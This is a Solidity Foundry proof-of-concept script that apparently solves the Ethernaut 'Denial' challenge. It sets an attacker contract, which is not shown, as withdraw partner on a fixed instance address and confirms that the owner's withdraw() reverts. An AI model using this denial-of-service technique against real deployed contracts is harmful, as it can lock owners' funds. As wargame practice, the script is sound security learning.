// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/20_Denial.sol";
import "../src/interfaces/20_IDenial.sol";
import "@oppenzeppelin/contracts/access/Ownable.sol";

address constant INSTANCE = 0x962DeFc7e4cF31e93C6623A4Af8d1384D1fC2D85;

contract DenialPOCScript is Script {
    IDenial instance = IDenial(INSTANCE);

    function run() external {
        vm.startBroadcast();

        DenialSolution solution = new DenialSolution();
        instance.setWithdrawPartner(address(solution));

        vm.stopBroadcast();

        vm.prank(instance.owner());
        vm.expectRevert();
        instance.withdraw{gas: 1000000}();
    }
}
